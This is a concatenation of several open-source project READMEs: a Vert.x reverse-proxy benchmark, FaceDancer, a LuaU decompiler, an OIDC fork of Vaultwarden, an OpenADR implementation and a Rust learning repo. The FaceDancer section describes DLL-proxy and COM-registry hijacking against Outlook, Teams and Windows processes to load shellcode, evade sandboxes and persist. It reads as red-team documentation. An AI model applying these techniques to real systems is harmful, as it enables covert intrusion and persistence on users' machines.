> The new io_uring interface added to the Linux Kernel 5.1 is a high I/O performance scalable interface for fully asynchronous Linux syscalls.

> Vert.x io_uring is based on Netty io_uring, more details on the GitHub project.

U can see more detail in [GitHub Project](https://github.com/netty/netty-incubator-transport-io_uring).

**With thd help of Vertx io_uring,sigma have high IO performance.**

### [Native transports](https://netty.io/wiki/native-transports.html)

> Vert.x can run with native transports (when available) on BSD (OSX) and Linux, these JNI transports add features specific to a particular platform, generate less garbage, and generally improve performance when compared to the NIO based transport.

**Sigma has improved data transfer speed with the help of Native Transport, although it can only work on some Linux and BSD systems, fortunately most services run on these systems.**

### [GraalVM native image](https://www.graalvm.org/latest/reference-manual/native-image/)

> Native Image is a technology to compile Java code ahead-of-time to a binary‚Äîa native executable. A native executable includes only the code required at run time, that is the application classes, standard-library classes, the language runtime, and statically-linked native code from the JDK.

When running applications as native executable files, compared to traditional Java running methods, it will have advantages such as faster startup speed, smaller packaging size, and smaller runtime memory usage.

**Sigma can be executed  as native executable files ,and it will adapt to the cloud native era better.**

**WARNING:**

By checking [GitHub actions runner image](https://github.com/actions/runner-images?tab=readme-ov-file) pre-installed software and [GraalVM Native image prerequisites](https://www.graalvm.org/latest/reference-manual/native-image/#prerequisites) requirements in GitHub actions, we found that the Windows 11 SDK is missing from the windows latest image of Github actions runner. If you need to use Sigma binary files for the Windows platform, please compile them yourself according to the documentation or deploy Sigma using Jar.

### [JAVA virtual thread](https://openjdk.org/jeps/444)

> Virtual threads are not faster threads ‚Äî they do not run code any faster than platform threads. They exist to provide scale (higher throughput), not speed (lower latency). There can be many more of them than platform threads, so they enable the higher concurrency needed for higher throughput according to Little's Law.

For IO intensive tasks, the load is usually not limited by the CPU, and in this case, even if the number of threads exceeds the number of cores, throughput cannot be improved.

> Virtual threads help to improve the throughput of typical server applications precisely because such applications consist of a great number of concurrent tasks that spend much of their time waiting.

Unlike the OS threading model (which typically manages threads through thread pools to reduce the overhead of creating threads and reusing threads), virtual threads provide higher throughput while not offering lower latency.

**Sigma have a high concurrency performance with the help of Vertx's support for virtual thread.**

## Feature List

1. **Route**
2. **Upstream**
3. **reverse-proxy**
4. **Load balance**
5. **plugin**

## Example Usage

### binary
To begin, download the latest program for your operating system and architecture from the Release page.

Next, place the sigma binary and configuration file on your server.

Finally, edit the configuration.

#### Access your computer in a LAN network via SSH

##### Step 1 : modify `sigma.json` file.

As we can see, it has 5 part to edit. The part of `proxy-server` is a proxy server protocol config, u can just use it by default.

`port: 80`:  means sigma http proxy server will bind on port 80.

```json
{
  ""proxy-server"": {
    ""http"": {
      ""id"": ""http-proxy-server"",
      ""server-id"": ""http-proxy-server"",
      ""port"": 80
    }
  }
}
```
The part of `proxy-client` is a http proxy server config, we don't need to modify except we want to adjust it to improve some performances.  
```json
{
  ""proxy-client"": {
    ""max-pool-size-per-server"": 256
  }
}
```
The part of router is a main config which decide what request the proxy will handler.

`proxy-server-id`: it config this router is belonged to which proxy server.

`route`: it define an array of http request path to handle.

`proxy-pass-id`: This configuration determines which proxy pass rule it will submit the request to.
```json
{
  ""router"": [
    {
      ""id"": ""router-first"",
      ""enable"": true,
      ""proxy-server-id"": ""http-proxy-server"",
      ""route"": [
        {
          ""id"": ""router-first-route-first"",
          ""enable"": true,
          ""path"": ""/test/*"",
          ""allow-method"": [],
          ""consumes"": [],
          ""produces"": [],
          ""proxy-pass-id"": ""proxy-pass-1""
        }
      ]
    }
  ]
}
```
The part of `proxy-pass` is a main config, this configuration determines how to handle requests received by the proxy server.

`upstream-id`: this proxy requst will send to which upsteam.

```json
{
  ""proxy-pass"": [
    {
      ""id"": ""proxy-pass-1"",
      ""upstream-id"": ""upstream-static-service-1""
    }
  ]
}
```

The part of `upstream` is a main config, this configuration define the server discoverty method , load balance rule, and upstream nodes.

This is a simple example, it means we will send proxy request to `http://localhost:8888` by `round-robin`, and the upsteam list is a static config.
```json
{
  ""upstream"": [
    {
      ""id"": ""upstream-static-service-1"",
      ""discovery"": ""static-config"",
      ""rule-strategy"": ""round-robin"",
      ""nodes"": [
        ""http://localhost:8888""
      ]
    }
  ]
}
```

#### step2 : start sigma

```shell
./sigma run net.oooops.sigma.Sigma -conf ${absolute path of sigma.json file} -options ${${absolute path of options.json file}} -instance 1 
```

### jar

#### step1
The step 1 are similar to the binary step 1.

#### 

```shell
java -jar sigma-vX.X.X-fat.jar ./sigma run net.oooops.sigma.Sigma -conf ${absolute path of sigma.json file} -options ${${absolute path of options.json file}} -instance 1
```

## Roadmap

![ROADMAP](./image/SIGMA-ROADMAP-V0.1.0-ALPHA.png)

## Milestone

- 2024-10-08 the version 0.1.0-alpha is done.

## Benchmark

### Benchmark Environments

Apple M1 Pro(10 vCPUs, 16 GB memory)

### Benchmark Test for reverse proxy

Only use sigma as the reverse proxy server,include path rewrite plugin,with no logging,or other plugins enabled.

### QPS

Because of M1 Pro CPU arch , it dont have Hyper-Threading tech, so, The test use 4 core for wrk, 4 core for nginx or sigma reverse proxy, and 2 core for upstream, upstream is only return a simple json response:

```json
{
  ""code"": 200,
  ""msg"": ""success"",
  ""data"": null
}
```
#### Upstream(on port 8888 and 8889)

```wiki
~ % wrk -t8 -c2000 -d30s http://localhost:8888
Running 30s test @ http://localhost:8888
  8 threads and 2000 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     1.60ms    2.70ms 129.17ms   95.30%
    Req/Sec    17.01k     5.87k   31.22k    68.83%
  4070138 requests in 30.09s, 322.17MB read
  Socket errors: connect 1756, read 161, write 0, timeout 0
Requests/sec: 135264.76
Transfer/sec:     10.71MB
```

#### Nginx(on port 8081):

```wiki
~ % wrk -t8 -c2000 -d1m http://localhost:8081
Running 1m test @ http://localhost:8081
  8 threads and 2000 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     3.74ms    2.32ms 135.17ms   95.69%
    Req/Sec     8.20k     2.99k   16.62k    67.24%
  3908370 requests in 1.00m, 547.91MB read
  Socket errors: connect 1756, read 227, write 15, timeout 0
  Non-2xx or 3xx responses: 28
Requests/sec:  65119.80
Transfer/sec:      9.13MB
```

#### Sigma(on port 80, path rewrite /test/* to /):

```wiki
~ % wrk -t8 -c2000 -d1m http://localhost/test/benchmark   
Running 1m test @ http://localhost/test/benchmark
  8 threads and 2000 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     3.53ms    2.13ms 137.37ms   88.09%
    Req/Sec     8.55k     2.83k   14.77k    70.42%
  4087162 requests in 1.00m, 654.83MB read
  Socket errors: connect 1756, read 189, write 0, timeout 0
Requests/sec:  68079.91
Transfer/sec:     10.91MB
```
Sigma is just a little bit faster than Nginx in some situation, but it's still very fast and we have a lot of room to improve.

## Contributing

We welcome contributions to Sigma! If you have any ideas, suggestions, or bug reports, please feel free to open an issue or submit a pull request.",1,0,1,Apache-2.0,build-binary-image-release.yaml,0.0
Tylous/FaceDancer,main,"

<p align=""center"" height=""310"" border=""2px solid #555"">
<img src=Screenshots/FaceDancer_logo.png height=""310"" border=""2px solid #555"">
<br>
<strong style=""font-size: large;"">FaceDancer</strong>

</p>


## Description
FaceDancer is an exploitation tool aimed at creating hijackable, proxy-based DLLs. FaceDancer performs two main functions:

* Recon: Scans a given DLL to create the export definition file for proxying.
* Attack: Creates a malicious DLL containing shellcode that can proxy valid function requests to the legitimate DLL.

FaceDancer contains numerous methods for performing DLL hijacking. These DLLs take advantage of either weak permissions on installation folders or COM-based system DLL image loading to load a malicious version of a legitimate DLL. Once loaded, the DLL executes the embedded shellcode while proxying valid requests for DLL functions to the legitimate DLL. This is done using a .def file to map the valid requests to the correct DLL, allowing a low-privilege user to proxy a legitimate DLL through a malicious one. This bypasses application whitelisting controls as FaceDancer targets native processes needed for standard operation, making it effective for initial access or persistence.

FaceDancer contains zero evasion techniques. FaceDancer‚Äôs sole focus is discovering and generating DLLs for proxying. It is important that the inputted DLL contains all the necessary evasion techniques. For more information about the techniques and how they are discovered, please see my [blog](https://www.blackhillsinfosec.com/a-different-take-on-dll-hijacking/).



#### Microsoft's Response
As of now, Microsoft has no plans to fix or remediate these issues but acknowledges them as valid vulnerabilities.

## Attack Methods

### DLL Based Proxy

At a high level, this involves exploiting DLLs that reside in folders that are not properly protected when installed, allowing an attacker to abuse the Load Image operation when the application is launched via DLL proxying. The overarching issue is that when Microsoft Teams is configured with an account, the application installs some additional plugins (including an Outlook plugin). Some of these plugins are installed in the user‚Äôs AppData folder with overly permissive permissions (i.e., write permission). Because of this, an attacker can rename a valid DLL in one of these directories that a process loads when it first launches and place their own malicious DLL in the same folder to have it automatically load and execute. This does not require admin privileges.

#### Example OneAuth.DLL

When Microsoft Teams v2 (aka Microsoft Teams for Work and School) is configured with a user‚Äôs profile, it installs a package called TeamsMeetingAddin into Outlook (if Outlook is installed). The folder containing the associated DLLs for this add-in can be modified by low-privilege users to both rename the legitimate DLLs and add malicious DLLs. This means the next time Outlook is launched, the malicious DLL is loaded by Outlook, leading to code execution as the Outlook process.


<p align=""center"">
<img src=Screenshots/OneAuth_ImageLoad.png border=""2px solid #555"">
<br>
</p>

All files in this directory can be modified by a low-privilege user.

<p align=""center"">
<img src=Screenshots/OneAuth_Permissions.png border=""2px solid #555"">
<br>
</p>

A DLL proxy attack is necessary to ensure that the original DLL is still loaded, preventing Outlook from crashing. The screenshot below demonstrates using this attack to execute arbitrary code, in this case, a Rust ‚ÄúHello, World!‚Äù program, via Outlook.
<p align=""center"">
<img src=Screenshots/Hello_World.png border=""2px solid #555"">
<br>
</p>


### Proxying Function Requests
Using definition files (.def), which are text files containing one or more module statements that describe various attributes of a DLL, we can define all the exported functions and proxy them to the legitimate DLL that contains the requested functions. By using an export.def file, we can rename the legitimate DLL to whatever we want (in the example below, we append -old to the name), place our DLL in the same folder, and when a process loads it, our DLL will proxy any requests for one of the DLL‚Äôs functions to the legitimate one. 

```
    EXPORTS
    ?IsZero@UUID@Authentication@Microsoft@@QEBA_NXZ=OneAuth-old.?IsZero@UUID@Authentication@Microsoft@@QEBA_NXZ @1
    GetLastOneAuthError=OneAuth-old.GetLastOneAuthError @2
    InitializeTelemetryCallbacks=OneAuth-old.InitializeTelemetryCallbacks @3
```

Because of this only one DLL is ever loaded (not OneAuth and OneAuth-legitmate) but when we look at the DLL's export functions we can see that each of the proxyed functions call back to OneAuth-legitmate.dll.

<p align=""center"">
<img src=Screenshots/Process_Running.png border=""2px solid #555"">
<br>
</p>

### COM based Proxying

COM-based DLL proxying takes a different approach. It exploits dependencies in numerous native Windows and third-party applications. When executed, as these processes start up, they query the registry for COM objects to find the path to certain system DLLs to load. What makes these requests interesting is that they first check the Current User (HKCU) section of the registry. If they are unable to find the values there, they fail over to another section of the registry where the entries exist.
<p align=""center"">
<img src=Screenshots/Olk_Calling_Com.png border=""2px solid #555"">
<br>
</p>
<p align=""center"">
<img src=Screenshots/Com_Value.png border=""2px solid #555"">
<br>
</p>
By creating the COM entries they look for, we can control which DLLs they load. Using the same proxy technique mentioned previously, we can load a DLL from anywhere as a system DLL and still proxy the traffic to the valid system DLL that resides in system32. This ensures there is no disruption to the process‚Äôs operation by still providing the valid functions. This all can be done as a low-privilege user without needing any privilege escalation or elevated permissions.

<p align=""center"">
<img src=Screenshots/msedge.dll.png border=""2px solid #555"">
<br>
</p>
<p align=""center"">
<img src=Screenshots/Beacon.png border=""2px solid #555"">
<br>
</p>

It works against Microsoft‚Äôs WindowsApp-based applications, including the new versions of Outlook (olk.exe) and Teams (ms-teams.exe). Applications in this folder are blocked even from Administrators. Attempting to access the folder to view the contents results in denied access, even when running as an Administrator.
<p align=""center"">
<img src=Screenshots/WindowApps.png border=""2px solid #555"">
<br>
</p>

This makes sideloading into these applications extremely difficult; however, they still rely on COM objects to load DLLs.
<p align=""center"">
<img src=Screenshots/Olk_Loading.png border=""2px solid #555"">
<br>
</p>

# How To Use

## Recon Mode

This mode allows FaceDancer to scan a specified DLL to generate the .def file for you. With this, you can then generate your own DLLs using FaceDancer rather then the pre-defined ones. 


### Recon
```
    ___________                   ________                                    
    \_   _____/____    ____  ____ \______ \ _____    ____   ____  ___________ 
     |    __) \__  \ _/ ___\/ __ \ |    |  \\__  \  /    \_/ ___\/ __ \_  __ \
     |     \   / __ \\  \__\  ___/ |    `   \/ __ \|   |  \  \__\  ___/|  | \/
     \___  /  (____  /\___  >___  >_______  (____  /___|  /\___  >___  >__|   
         \/        \/     \/    \/        \/     \/     \/     \/    \/                                              
                                    (@Tyl0us)
                
Reconnaissance tools

Usage: FaceDancer recon [OPTIONS]

Options:
  -I, --Input <INPUT>  Path to the DLL to examine.
  -E, --exports        Displays the exported functions for the targeted DLL (only will show the first 20)
  -G, --generate       Generates the necessary .def for proxying
  -h, --help           Print help
```

## Attack Mode

This mode generates the actual DLLs used for proxying attacks. It works by taking an existing malicious DLL containing your shellcode and converting it into shellcode. Since FaceDancer does not contain any EDR evasion techniques, it is important that the inputted DLL includes all the necessary evasion techniques. This also means any type of DLL (not just Rust DLLs) can be used. Additionally, you can select the type of DLL attack you want to execute:
* `DLL` - Generates a DLL to be dropped into a specific folder. Depending on which DLL you generate, you need to navigate to a different directory. Once there, rename the original DLL, paste your DLL in that folder.
* `COM` - Generates a DLL along with the required registry entries to exploit it. With this type of DLL, any process that calls that COM object will load the DLL and execute the shellcode. For this to work, the provided registry keys need to be added to the HKCU section of the registry.
* `Process` -  Generates a DLL along with the required registry entries to exploit it. With this type of DLL, only when the specified process loads the DLL will the shellcode execute. For this to work, the provided registry keys need to be added to the HKCU section of the registry.

### Attack

```
    ___________                   ________                                    
    \_   _____/____    ____  ____ \______ \ _____    ____   ____  ___________ 
     |    __) \__  \ _/ ___\/ __ \ |    |  \\__  \  /    \_/ ___\/ __ \_  __ \
     |     \   / __ \\  \__\  ___/ |    `   \/ __ \|   |  \  \__\  ___/|  | \/
     \___  /  (____  /\___  >___  >_______  (____  /___|  /\___  >___  >__|   
         \/        \/     \/    \/        \/     \/     \/     \/    \/                                              
                                    (@Tyl0us)
                
Attack tools

Usage: FaceDancer attack [OPTIONS]

Options:
  -O, --Output <OUTPUT>    Name of output DLL file.
  -I, --Input <INPUT>      Path to the 64-bit DLL.
  -D, --DLL <DLL>          The DLL to proxy: 
                                               [1] OneAuth.dll
                                               [2] ffmpeg.dll (warning can be unstable)
                                               [3] skypert.dll
                                               [4] SlimCV.dll
  -C, --COM <COM>          The COM-DLL to proxy: 
                                               [1] ExplorerFrame.dll
                                               [2] fastprox.dll
                                               [3] mssprxy.dll
                                               [4] netprofm.dll
                                               [5] npmproxy.dll
                                               [6] OneCoreCommonProxyStub.dll
                                               [7] propsys.dll                                    
                                               [8] stobject.dll
                                               [9] wbemprox.dll
                                               [10] webplatstorageserver.dll
                                               [11] Windows.StateRepositoryPS.dll              
                                               [12] windows.storage.dll
                                               [13] wpnapps.dll
  -P, --PROCESS <PROCESS>  Process to proxy load into: 
                                               [1] Outlook
                                               [2] Excel
                                               [3] svchost
                                               [4] Explorer
                                               [5] sihost
                                               [6] msedge
                                               [7] OneDriveStandaloneUpdater                             
                                               [8] SSearchProtocolHost
                                               [9] Olk
                                               [10] Teams
                                               [11] Werfault            
                                               [12] Sdxhelper
                                               [13] AppHostRegistrationVerifier
                                               [14] rdpclip
                                               [15] Microsoft.SharePoint
                                               [16] MusNotificationUx
                                               [17] PhoneExperienceHost
                                               [18] taskhostw
                                               [19] DllHost      
                                                               
  -s, --sandbox            Enables sandbox evasion by checking:
                                               - Is Endpoint joined to a domain?
                                               - Is the file's name the same as its SHA256 value?
  -h, --help               Print help

```


## Contributing
FaceDancer was developed in Rust.



## Help

```


    ___________                   ________                                    
    \_   _____/____    ____  ____ \______ \ _____    ____   ____  ___________ 
     |    __) \__  \ _/ ___\/ __ \ |    |  \\__  \  /    \_/ ___\/ __ \_  __ \
     |     \   / __ \\  \__\  ___/ |    `   \/ __ \|   |  \  \__\  ___/|  | \/
     \___  /  (____  /\___  >___  >_______  (____  /___|  /\___  >___  >__|   
         \/        \/     \/    \/        \/     \/     \/     \/    \/                                              
                                    (@Tyl0us)
                
Does awesome things

Usage: FaceDancer [COMMAND]

Commands:
  recon   Reconnaissance tools
  attack  Attack tools
  help    Print this message or the help of the given subcommand(s)

Options:
  -h, --help     Print help
  -V, --version  Print version
```


## Install

#### Note Please Ensure All Dependencies Are Installed  


If `Rust` and `Rustup` is not installed please install them. If you are compiling it from OSX or Linux sure you have the target ""x86_64-pc-windows-gnu"" added. To so run the following command:
```
rustup target add x86_64-pc-windows-gnu
```

Once done you can compile FaceDancer, run the following commands, or use the compiled binary (found in the pre-compiled folder):
```
cargo build --release
```
From there the compiled version will be found in in target/release (note if you don't put ```--release``` the file will be in target/debug/ )

### Credit
Special thanks to Teach2Breach for developing [dll2shell](https://github.com/Teach2Breach/dll2shell/tree/main)

",1,0,1,MIT,,0.0
shrimp-nz/medal,main,"Medal's LuaU decompiler

All credits to this project goes to in honor and memory of:
Jujhar Singh (KowalskiFX)
Mathias Pedersen (Costomality)

While details of how they passed and our relationship with them are completely irrelevant its better if their legacy 
does not go in vain. 

Keep the Singh and Pedersen family in you guys prayers.
We love you both.
",0,0,1,MIT,,0.0
Timshel/OIDCWarden,main,"# OIDCWarden

Fork from [dani-garcia/vaultwarden](https://github.com/dani-garcia/vaultwarden).
Goal is to provide an OIDC compatible solution with the ultimate goal of merging features back in Vaultwarden.

## Versions

Tagged version are based on Bitwarden web client releases, Ex: `v2024.8.3-1` is the first release compatible with web client `v2024.8.3`.
\
See [changelog](CHANGELOG.md) for more details.

## Configuration

See details in [SSO.md](SSO.md).

## Features

### Role mapping

Allow to map roles from the Access token to users to grant access to `VaultWarden` `admin` console.
Support two roles: `admin` or `user`.

This feature is controlled by the following conf:

- `SSO_ROLES_ENABLED`: control if the mapping is done, default is `false`
- `SSO_ROLES_DEFAULT_TO_USER`: do not block login in case of missing or invalid roles, default is `true`.
- `SSO_ROLES_TOKEN_PATH=/resource_access/${SSO_CLIENT_ID}/roles`: path to read roles in the Access token

### Group/Organization invitation mapping

Allow to invite user to existing Oganization if they are listed in the Access token.
If activated it will check if the token contain a list of potential Orgnaization.
If an Oganization with a matching name (case sensitive) is found it will the start the invitation process for this user.
It will use the email associated with the Organization to send further notifications (admin side).

The flow look like this:

- Decode the JWT Access token and check if a list of organization is present (default path is `/groups`).
- Check if an Organization with a matching name exist and the user is not part of it (Use group name mapping if `SSO_ORGANIZATIONS_ID_MAPPING` is defined).
- if mail are activated invite the user to the Orgnization
  - The user will need to click on the link in the mail he received
  - A notification is sent tto he `email` associated with the Organization that a new user is ready to join
  - An admin will have to validate the user to finalize the user joining the org.
- Otherwise just add the user to the Organization
  - An admin will have to validate the user to confirm the user joining the org.

One of the bonus of invitation is that if an organization define a specific password policy then it will apply to new user when they set their new master password.
If a user is part of two organizations then it will order them using the role of the user (`Owner`, `Admin`, `User` or `Manager` for now manager is last :() and return the password policy of the first one.

This feature is controlled with the following conf:

- `SSO_SCOPES`: Optional scope override if additionnal scopes are needed, default is `""email profile""`
- `SSO_ORGANIZATIONS_INVITE`: control if the mapping is done, default is `false`
- `SSO_ORGANIZATIONS_TOKEN_PATH`: path to read groups/organization in the Access token, default is `/groups`
- `SSO_ORGANIZATIONS_ID_MAPPING`: Optional, allow to map provider group to a Vaultwarden organization `uuid` (default `""""`, format: `""ProviderId:VaultwardenId;""`)

## Docker

Change the docker files to package both front-end from [Timshel/oidc_web_vault](https://github.com/Timshel/oidc_web_vault/releases).
\
By default it will use the release which only make the `sso` button visible.

If you want to use the version with the additional features mentionned, default redirection to `/sso` and fix organization invitation.
You need to pass an env variable: `-e SSO_FRONTEND='override'` (cf [start.sh](docker/start.sh)).

Docker images available at:

 - Docker hub [hub.docker.com/r/timshel/oidcwarden](https://hub.docker.com/r/timshel/oidcwarden/tags)
 - Github container registry [ghcr.io/timshel/oidcwarden](https://github.com/Timshel/oidcwarden/pkgs/container/oidcwarden)

### Front-end version

By default front-end version is fixed to prevent regression (check [CHANGELOG.md](CHANGELOG.md)).
\
When building the docker image it can be overrided by passing the `OIDC_WEB_RELEASE` arg.
\
Ex to build with latest: `--build-arg OIDC_WEB_RELEASE=""https://github.com/Timshel/oidc_web_vault/releases/latest/download""`

## To test VaultWarden with Keycloak

[Readme](docker/keycloak/README.md)

## DB Migration

ATM The migrations add two tables `sso_nonce`, `sso_users` and a column `invited_by_email` to `users_organizations`.

### Revert to default VW

Reverting to the default VW DB state can easily be done manually (Make a backup :) :

```psql
>BEGIN;
BEGIN
>DELETE FROM __diesel_schema_migrations WHERE version in ('20230910133000', '20230914133000', '20240214170000', '20240226170000', '20240306170000', '20240313170000');
DELETE 5
>DROP TABLE sso_nonce;
DROP TABLE
>DROP TABLE sso_users;
DROP TABLE
>ALTER TABLE users_organizations DROP COLUMN invited_by_email;
ALTER TABLE
> COMMIT / ROLLBACK;
```

## Configuration

### Zitadel

To use the role mapping feature you will need to define a custom mapping to return a simple list of role.
More details in Zitadel [documentation](https://zitadel.com/docs/guides/integrate/retrieve-user-roles#customize-roles-using-actions); the cutomization will look something like this:

```javascript
function flatRoles(ctx, api) {
  if (ctx.v1.user.grants == undefined || ctx.v1.user.grants.count == 0) {
    return;
  }

  let grants = [];
  ctx.v1.user.grants.grants.forEach(claim => {
    claim.roles.forEach(role => {
        grants.push(role)
    })
  })

  api.v1.claims.setClaim('my:zitadel:grants', grants)
}
```
",0,2,1,AGPL-3.0,"build.yml,hadolint.yml,release.yml,releasecache-cleanup.yml,trivy.yml",0.0
OpenLEADR/openleadr-rs,main,"![maintenance-status](https://img.shields.io/badge/maintenance-actively--developed-brightgreen.svg)
![codecov](https://codecov.io/gh/OpenLEADR/openleadr-rs/graph/badge.svg?token=BKQ0QW9G8H)
![Checks](https://github.com/OpenLEADR/openleadr-rs/actions/workflows/checks.yml/badge.svg?branch=main)

# OpenADR 3.0 in Rust

![LF energy OpenLEADR logo](https://github.com/OpenLEADR/openleadr-rs/raw/refs/heads/main/openleadr-logo.svg)

This repository contains an OpenADR 3.0 client (VEN) library and a server (VTN) implementation, both written in Rust.
OpenADR is a protocol for automated demand-response in electricity grids, like dynamic pricing or load shedding.
The [OpenADR alliance](https://www.openadr.org/) is responsible for the standard,
which can be [downloaded](https://www.openadr.org/specification) free of charge.

This implementation is still work-in-progress. We aim for a first field-test-ready release in Dec 2024 / Jan 2025.

Thanks to our sponsors [ElaadNL](https://elaad.nl/en/) and [Tweede golf](https://tweedegolf.nl/en)
for making this work possible.

## Documentation

The documentation of the project is an ongoing effort as part of the first release.
The [`./openleadr-client`](./openleadr-client) and [`./openleadr-vtn`](./openleadr-vtn) contain Readmes on how to get
started with the client library and server, respectively.
Additionally, the [client](https://crates.io/crates/openleadr-client), [server](https://crates.io/crates/openleadr-vtn),
and [common data types](https://crates.io/crates/openleadr-wire) are published to crates.io
and have documentation available on docs.rs.
As an addition, [#17](https://github.com/OpenLEADR/openleadr-rs/issues/17) aims
to produce a detailed OpenAPI specification of the VTN API we provide. 

## Getting started

### First time setup

Your machine needs a recent version of Rust installed.
Please refer to the [official installation website](https://rustup.rs/) for instructions for your platform. To apply the database migrations, you also need the sqlx-cli installed.
Simply run `cargo install sqlx-cli`. Additionally, you need `postgresql-client` installed (version 16 or newer).

### Docker compose

For a quick start,
this repository contains a [`docker-compose.yml`](docker-compose.yml) with the VTN and a Postgres database.
To start it, first start the database and run the migrations:

```bash
docker compose up -d db # start the DB
cargo sqlx migrate run  # apply the migrations
docker compose up -d    # start all other containers, i.e., the VTN
```

Afterward, the VTN should be reachable at `http://localhost:3000`.

For a more detailed guide,
please refer to the Readmes in the [`./openleadr-client`](./openleadr-client) and 
[`./openleadr-vtn`](./openleadr-vtn) directories.

## Supported features

This repository contains only OpenADR 3.0, older versions are not supported.

Currently, real-time updates via the webhook mechanism, known as subscriptions in the specification, are not supported.
While we currently do not plan to add this ourselves, we warmly welcome any contribution or sponsoring to add it.
See the [Contributing section](#contributing) if you are interested.

At the moment, the VTN implements its own OAuth provider,
but we plan to allow for a third-party OAuth provider as well, 
see [#26](https://github.com/openLEADR/openleadr-rs/issues/26).

The client and server do support creating, retrieving, updating,
and deleting programs, events, reports, VENs, and resources.
Both sides support authentication and authorization handling
and optionally allow for a more fine-grained access control than required by the specification.

The VTN stores the data in a Postgres database,
but the code base is ready for using other data stores as well in the future.
Again, we warmly welcome contributions or sponsoring if you are interested in adding additional storage support.

The VEN is a library for conveniently interacting with the REST API provided by a VTN.
We aim for a clean and easy-to-understand API of the library to be used by business or VEN logic.
Additionally, we will use the library to create a CLI application for easy testing and prototyping, 
see [#52](https://github.com/OpenLEADR/openleadr-rs/issues/52) for the current progress.

## Testing
The Rust tests in this repository cover most of the functionality.
We use [CodeCov](https://app.codecov.io/gh/OpenLEADR/openleadr-rs/) to keep track of the test coverage,
and have an outstanding issue [#75](https://github.com/OpenLEADR/openleadr-rs/issues/75)
to improve the test coverage even further.
These tests are executed in GitHub Actions on every pull request.
To execute them locally, run:

```bash
docker compose up db -d     # start up a Postgres DB in the background
cargo sqlx migrate run # apply the DB scheme
# load default credentials for integration testing of the client library
psql -U openadr -W openadr -h localhost openadr < fixtures/test_user_credentials.sql
cargo test --workspace      # execute the tests
```

In addition to the tests we developed ourselves, there exists a test suite maintained by the OpenADR alliance.
As it is closed source, we cannot integrate this test suite with the CI, unfortunately.
Nevertheless, we executed the tests locally to check for incompatibilities.
Currently, all except for two of the 168 test cases that are applicable for us pass.

The two failing test cases are a result of that we do the permission management a bit different from the specification.
In particular, we do not allow VENs to delete their own reports but instead allow this to the business logic (BL).
The two test cases assume the opposite, VENs should be able to delete reports, and BLs should not be able to.
See also [#11](https://github.com/OpenLEADR/openleadr-rs/issues/11).

The following screenshot shows the test results of the test suite from the OpenADR alliance,
executed against commit [`5c4e281`](https://github.com/OpenLEADR/openleadr-rs/tree/5c4e281fdc96f7332675325e0d4da8cc1005dfe2).
The 38 failing tests not mentioned before are testing the *subscription*
feature not supported by this application yet.
See also [Supported features](#supported-features).

![OpenADR alliance test suite screenshot](OpenADR_alliance_test_suite.png)

## Contributing
We expect you to follow our [code of conduct](CODE_OF_CONDUCT.md) for any contribution.

If you are missing a feature or see unexpected behavior, 
do not hesitate to open an issue on our [GitHub](https://github.com/OpenLEADR/openleadr-rs) page.
If you suspect a security-critical issue, please refer to [`SECURITY.md`](SECURITY.md).

Additionally, we are happy to see pull requests on this repository as well.
We prefer to know when you intend to develop some functionality to make sure that there aren't multiple people working on the same issue. Simply drop a short note to the corresponding issue.

For your commits, please make sure you add a `signed-off-by` appendix to your commit message,
as the [LF energy contribution guidelines](https://tac.lfenergy.org/process/contribution_guidelines.html#developer-certificate-of-origin) require that.
By doing so, you acknowledge the text in [`CONTRIBUTING`](CONTRIBUTING).
The easiest way is to add a `-s` flag to the `git commit` command, i.e. use `git commit -s`.

If you are interested in contributing but don't know where to start, 
check out issues marked as [good first issue](https://github.com/OpenLEADR/openleadr-rs/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)
or [help wanted](https://github.com/OpenLEADR/openleadr-rs/issues?q=is%3Aissue+is%3Aopen+label%3A%22help+wanted%22),
or simply open an issue and ask for good starting points.

## Interoperability
The code in this repository is written in Rust.
Nevertheless, you can combine the server, i.e.,
VTN implementation with a client, i.e., VEN witten in any language you prefer, such as Python, Node.js, or Java.
This is simply because the VTN is a stand-alone binary and the interactions with the VEN happen over HTTP.

If your business or client logic is written in Rust,
you may be interested in using the client library of this repository as well.
It is mainly a thin layer to abstract the HTTP interaction with the VTN.
Thus, if your application is written in another language than Rust,
it is most likely less work
to write a small HTTP abstraction layer yourself
than using a language interoperability layer on top of our client library.  

## Help us make an impact: We're seeking funding!

As of Fall 2024, we are actively seeking EUR 40.000 in funding to take the next crucial steps. Achieving this goal will allow us to:

- **Deliver a field-test-ready release** by December 2024 / January 2025.
- **Ensure ongoing professional development and maintenance** throughout 2025.
- **Secure the project's long-term viability** as a cornerstone for numerous energy projects.

Funding is managed by the [Trifecta Tech Foundation](https://trifectatech.org) (TTF). For more details or to request our sponsorship prospectus, please visit the [project's page](https://trifectatech.org/initiatives/automated-demand-response/) on the foundation's website.

### About Trifecta Tech Foundation

TTF is a Netherlands-based non-profit (501(c)(3) equivalent) dedicated to developing and maintaining open infrastructure software for the public good.

In addition to safeguarding the long-term sustainability of OpenLEADR-rs, TTF also supports open-source projects in time synchronization and data compression. Notably, its Network Time Protocol software is a critical component at Let‚Äôs Encrypt, the world‚Äôs largest certificate authority.

### Current sponsors
- [ElaadNL](https://elaad.nl/en/)
- [Tweede golf](https://tweedegolf.nl/en)
",1,13,2,NOASSERTION,checks.yml,37.0
dexter-xD/7Days7RustProjects,main,"# 7Days7RustProjects

A collection of Rust projects designed to guide beginners through various programming concepts, from basic CLI tools to advanced emulation. Each project increases in difficulty, promoting a comprehensive learning curve.

## Overview

This repository contains:

- **Day 1**: Command Line Todo List üêö
- **Day 2**: Temperature Converter GUI üå°Ô∏è
- **Day 3**: File Encryptor/Decryptor üîí
- **Day 4**: Web Scraper with Actix Web üï∏Ô∏è
- **Day 5**: 2D Game Renderer üéÆ
- **Day 6**: TUI Chat Application üí¨
- **Day 7**: CHIP-8 Emulator üëæ

## Projects

### Day 1: CLI Todo List
- **Difficulty**: Beginner
- **Features**: Add, remove, list todos.

### Day 2: Temperature Converter GUI
- **Difficulty**: Beginner-Intermediate
- **Features**: Convert between Celsius and Fahrenheit.

### Day 3: File Encryptor/Decryptor
- **Difficulty**: Intermediate
- **Features**: Basic file encryption/decryption.

### Day 4: Web Scraper with Actix
- **Difficulty**: Intermediate
- **Features**: Scrape website data and serve via HTTP.

### Day 5: 2D Game Renderer
- **Difficulty**: Intermediate-Advanced
